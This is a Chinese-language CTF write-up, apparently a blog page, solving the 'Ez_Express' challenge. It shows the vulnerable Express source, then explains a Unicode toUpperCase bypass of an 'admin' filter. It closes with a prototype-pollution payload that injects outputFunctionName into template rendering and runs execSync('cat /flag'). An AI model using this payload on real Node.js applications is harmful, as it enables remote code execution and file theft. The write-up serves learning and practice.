@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="复现平台: buuoj  分析 抓包看源码，发现www.zip，阅读发现关键文件index.js 用户数据存储在req.session.user中 流程 导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染 结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，覆盖？通过注册实现，但是有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ez_Express_CYCTF20">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="复现平台: buuoj  分析 抓包看源码，发现www.zip，阅读发现关键文件index.js 用户数据存储在req.session.user中 流程 导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染 结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，覆盖？通过注册实现，但是有">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-30T00:57:46.857Z">
+<meta property="article:modified_time" content="2024-11-01T10:52:00.564Z">
+<meta property="article:tag" content="recurrence">
+<meta property="article:tag" content="proto pollution">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ez_Express_CYCTF20</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/30/ctfshow_nodejs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/30/notes_wangding20/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&text=Ez_Express_CYCTF20"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&is_video=false&description=Ez_Express_CYCTF20"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ez_Express_CYCTF20&body=Check out this article: https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&name=Ez_Express_CYCTF20&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&t=Ez_Express_CYCTF20"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#index-js"><span class="toc-number">2.</span> <span class="toc-text">index.js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%AD%A3"><span class="toc-number">3.</span> <span class="toc-text">*修正</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ez_Express_CYCTF20
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-30T00:57:46.857Z" class="dt-published" itemprop="datePublished">2024-10-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/proto-pollution/" rel="tag">proto pollution</a>, <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>复现平台: buuoj</p>
+</blockquote>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
+<li>抓包看源码，发现<a target="_blank" rel="noopener" href="http://www.zip,阅读发现关键文件index.js/">www.zip，阅读发现关键文件index.js</a><ol>
+<li>用户数据存储在req.session.user中</li>
+<li>流程<ol>
+<li>导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染</li>
+<li>结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，<strong>覆盖</strong>？通过注册实现，但是有安全检查，等下再绕过，看看搞不搞得通<ol>
+<li>思路1<ol>
+<li>登录admin后传<strong>body污染原型链</strong>，原型链只能在登录后进行污染</li>
+<li>获取信息，带外(需要命令执行)&#x2F;回显(难，没法读文件)，这里肯定要读文件，可不可以进行命令执行 -&gt; 通过原型链污染后新建的对象都会有某个属性，将某个属性设置为一个函数，<strong>执行命令</strong>，理论可行，可以执行命令直接看反弹shell，不出网就用回显处理(类似wangding24 web02)</li>
+</ol>
+</li>
+<li>思路1待解决<ol>
+<li>覆盖需要绕过，match()绕过，处理match还对username**进行了什么处理(从处理想对策)**，可能有用？toUpperCase()？<ol>
+<li><a target="_blank" rel="noopener" href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">toUpperCase</a>，可以进行绕过，这里node漏洞的</li>
+</ol>
+</li>
+<li>命令执行部分使用shell.js可以一试，需要找到一个对象访问它的属性但是被覆盖 -&gt; 先访问&#x2F;action在访问&#x2F;info有res.outputFunctionName(在&#x2F;目录中的和&#x2F;action中的不一样)，通过<code>&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;: function() &#123;命令执行实现&#125;&#125;</code><ol>
+<li><a target="_blank" rel="noopener" href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<h2 id="修正"><a href="#修正" class="headerlink" title="*修正"></a>*修正</h2><ol>
+<li>思路没有错就胜利很多了</li>
+<li>fix1: 这里的<strong>访问属性调用函数有问题</strong><ol>
+<li>payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code>这样来调用，插入模板进行调用，反而如果直接定义函数的的话无法被调用</li>
+</ol>
+</li>
+<li>fix2: 注意传输json对象时要<strong>修改content-type: application&#x2F;json</strong></li>
+</ol>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol>
+<li>注册<code>admın</code>成功进行覆盖</li>
+<li>访问<code>/action</code>并进行覆盖，payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></li>
+<li>访问<code>/info</code></li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>几个核心思想<ol>
+<li>读文件一般需要命令或者包含</li>
+<li>进行了什么处理(从处理想对策)如uppercase</li>
+<li>这种源码路由题还是先从路由再到细节想思路，不会太跳跃</li>
+</ol>
+</li>
+<li>ref<ol>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">p神的js toUpperCase绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li>
+</ol>
+</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#index-js"><span class="toc-number">2.</span> <span class="toc-text">index.js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%AD%A3"><span class="toc-number">3.</span> <span class="toc-text">*修正</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&text=Ez_Express_CYCTF20"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&is_video=false&description=Ez_Express_CYCTF20"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ez_Express_CYCTF20&body=Check out this article: https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&title=Ez_Express_CYCTF20"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&name=Ez_Express_CYCTF20&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/10/30/Ez_Express_CYCTF20/&t=Ez_Express_CYCTF20"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
